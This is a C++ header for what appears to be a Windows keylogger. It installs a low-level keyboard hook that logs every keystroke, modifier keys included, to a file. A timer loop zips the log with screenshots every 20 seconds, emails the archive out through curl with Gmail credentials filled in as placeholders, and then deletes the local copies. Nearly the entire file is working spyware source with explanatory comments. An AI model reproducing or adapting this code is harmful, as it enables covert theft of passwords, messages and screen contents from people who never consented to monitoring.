#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include <windows.h>
#include "keyConstants.h"
#include <vector>
#include"curlSendMail.h"
#include"IO.h"
#include"SendMail.h"
#include "Screenshots.h"
#include "Globals.h"
#include"zip.h"
#include"unzip.h"
std::string keylog = "";//This is a string variable where all the key stokes will be stored
std::string keyLogsAll = "";

std::string _FROM = "yourgmailid@gmail.com";
std::string _TO = "yourgmailid@gmail.com"; // because mails will be sent from your email to your email. so both from and to will be same 
std::string username = "yourgmailid@gmail.com"; // required to login
std::string _PASSWORD = "your_app_password"; //Generated app password from Gmail's security settings
#define FILENAME ZIP_FILE
#define MAX_PATH_SZ 1024

void TimerSendMail(int bSend) {

    char currDir[MAX_PATH];
    sprintf(currDir, "%s", std::string(IO::GetOurPath()).c_str());
    SetCurrentDirectoryA(currDir);

    while (1) {
        Sleep(20000); //send mail after every 20 secs

        HZIP hz = (HZIP)INVALID_HANDLE_VALUE; DWORD writ;

        std::string zipfileWithPath = std::string(ZIP_FILE);

        // EXAMPLE 1 - create a zipfile from existing files
        TCHAR zipFileToSend[MAX_PATH];
        _tcscpy_s(zipFileToSend, CA2T(zipfileWithPath.c_str()));

        hz = CreateZip(zipFileToSend, 0);

        HANDLE hFile = NULL;
        std::string fileNamePath = IO::GetOurPath(true) + std::string(LOG_FILE);
        hFile = CreateFileA(
            fileNamePath.c_str(),     // Filename
            GENERIC_READ,  // append mode  // Desired access
            FILE_SHARE_READ,        // Share mode
            NULL,                   // Security attributes
            OPEN_EXISTING, // Open existing file
            FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
            NULL);                  // Template file handle

        if (hFile == INVALID_HANDLE_VALUE) {
            Helper::WriteAppLog(" File not exist yet or it might be used by another process");
            //continue;
        }
        DWORD dwFileSize = GetFileSize(hFile, NULL);
        CloseHandle(hFile);

        if (dwFileSize == 0 || dwFileSize == oldSize) {
            // only send mail if file has some new content
            Helper::WriteAppLog(" No any data written in file yet ");
            //continue;
        }

        std::string last_file = IO::Writelog(keylog);

        if (last_file.empty()) {
            Helper::WriteAppLog("File Creation was not successfull . keylog '" + keylog + "'");
            return;
        }
 
        std::string txtkeyLogFile = std::string(LOG_FILE);
        std::string attachs = IO::GetOurPath(true) + last_file + "::" + fullPathOfImage1;
 
        TCHAR txtFileNameToAttach[MAX_PATH];
        _tcscpy_s(txtFileNameToAttach, CA2T(txtkeyLogFile.c_str()));
        ZipAdd(hz, txtFileNameToAttach, txtFileNameToAttach);

        /*std::string cmdi = std::string(ZIP_EXEC_CMD) + IO::GetOurPath() + "\\" + std::string(ZIP_FILE);
        cmdi += " ";
        std::string execmd = cmdi + IO::GetOurPath() + "\\" + std::string(LOG_FILE);
        execmd += " ";
        execmd = execmd + IO::GetOurPath(true) + std::string(IMG_FILE);
        system(execmd.c_str());*/

        for (long i = 0; i < imgFileNames.size(); i++) {
            TCHAR imgFileToAttach[MAX_PATH];
            _tcscpy_s(imgFileToAttach, CA2T(imgFileNames[i].c_str()));
            ZipAdd(hz, imgFileToAttach, imgFileToAttach);
        }

        CloseZip(hz);

        zipfileWithPath = IO::GetOurPath(true) + std::string(ZIP_FILE);

        curlSendMail::sendFinalmail(_TO, _FROM, username,  _PASSWORD, zipfileWithPath, std::string(ZIP_FILE));

        DeleteFileA(zipfileWithPath.c_str());

        for (long i = 0; i < imgFileNames.size(); i++) {
            DeleteFileA(imgFileNames[i].c_str());
        }

        imgFileNames.clear();

        if (dwFileSize >= 1000000) { //clear the file if file size become greater than 1 MB
            ofstream myfile;
            myfile.open(last_file);
            if (myfile.is_open()) {
                myfile << ""; //Emptying the file
                oldSize = 0;
                myfile.close();
            }
        }
    }
}
HHOOK eHook = NULL;//The is a handle to hook variable

void runKbHook(void);

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {//This function will be called everytime a key is pressed on keyboard
    Helper::WriteAppLog(" In Keyboard Proc Func");
    if (nCode < 0) {
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }

    KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;//KBDLLHOOKSTRUCT have to see on internet

    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {//This is just pressing the key and holding it..not pressing the key and releasing the key
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if (kbs->vkCode == VK_RETURN) {
            keylog += '\n';
        }
    }
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {//This is for that keys are released after pressing
       //we are only interested in releasing of special keys like shift
       //we want to store like [shift(pressed)][a][b][/shift(released)]
       // so we will know what letters was pressed while key shift was pressed
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT
            || key == VK_LSHIFT || key == VK_RSHIFT || key == VK_MENU || key == VK_LMENU
            || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN) {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");//appending back slash to represent release of key
            keylog += KeyName;
        }
    }
    std::string last_file_name = IO::Writelog(keylog);
    //keyLogsAll += keylog;
    keylog = "";
    return CallNextHookEx(eHook, nCode, wparam, lparam);

}


static bool InstallHook() {

    /*
    A hook is a mechanism by which an application can intercept events, such as messages, mouse actions, and keystrokes.
    A function that intercepts a particular type of event is known as a hook procedure.
    A hook procedure can act on each event it receives, and then modify or discard the event.
    */

    Helper::WriteAppLog("Hook started... Timer started");
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
    return eHook == NULL;
    /*WH_KEYBOARD :- we use Keyboard hook, LL means Low level
    OurKeyboardProc = Procedure envoked by the hook system when everytime user pressed the key on keyboard
    we are converting this because SetWindowsHookEx accept handle to hook procedure
    */
}

bool UninstallHook() {
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool isHooked() {
    return (bool)(eHook == NULL);
}

void runKbHook(void) {
    if (InstallHook()) {
        Helper::WriteAppLog("Hook is NULL");

    }
    else {
        Helper::WriteAppLog("Hook is not NULL");
    }
    return;
}
#endif // KEYBHOOK_H
